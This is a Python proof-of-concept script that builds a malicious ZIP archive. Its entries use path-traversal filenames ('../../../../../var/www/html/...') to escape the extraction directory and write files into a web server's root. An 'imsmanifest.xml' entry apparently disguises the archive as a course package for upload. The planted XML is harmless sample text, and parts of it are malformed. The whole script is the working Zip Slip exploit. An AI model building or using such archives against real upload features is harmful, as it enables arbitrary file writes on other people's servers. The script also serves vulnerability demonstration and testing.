import io
import zipfile

def create_zip_in_memory():
    memory_zip = io.BytesIO()

    with zipfile.ZipFile(memory_zip, mode='w') as zf:
        zf.writestr('../../../../../var/www/html/xxxr/xxx/poc/xadmin.xml', 'encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
        zf.writestr('../../../../../var/www/html/xxx/xxx/poc/admin.xml', '<?xml version="1.0" encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
        zf.writestr('imsmanifest.xml', '<?xml version="1.0" encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')

    # move to the beginning of the in-memory by stream
    memory_zip.seek(0)

    with open('poc.zip','wb') as file:
        file.write(memory_zip.read())

    memory_zip.close()

if __name__ == "__main__":
    create_zip_in_memory()

